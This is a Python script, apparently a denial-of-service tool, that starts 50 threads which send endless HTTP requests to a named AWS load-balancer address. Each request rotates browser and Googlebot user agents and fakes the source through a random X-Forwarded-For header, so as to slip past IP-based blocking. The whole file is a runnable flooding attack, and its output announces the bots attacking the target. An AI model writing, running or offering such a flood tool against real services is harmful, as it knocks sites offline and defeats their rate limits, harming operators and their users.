import requests
import threading
import time
import random

target_url = "http://DDoSLoadbalancer-715667085.eu-north-1.elb.amazonaws.com"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

def bot_attack(bot_id):
    while True:
        try:
            # Random spoofed IP
            fake_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": fake_ip  # Spoofed IP in header
            }
            response = requests.get(target_url, headers=headers)
            print(f"Bot {bot_id} (Source IP: {fake_ip}): {response.status_code}")
        except Exception as e:
            print(f"Bot {bot_id} error: {e}")
        time.sleep(random.uniform(0.1, 2))

num_bots = 50
threads = []
for i in range(num_bots):
    thread = threading.Thread(target=bot_attack, args=(i,))
    threads.append(thread)
    thread.start()

print(f"Started {num_bots} bots attacking {target_url} with IPs!")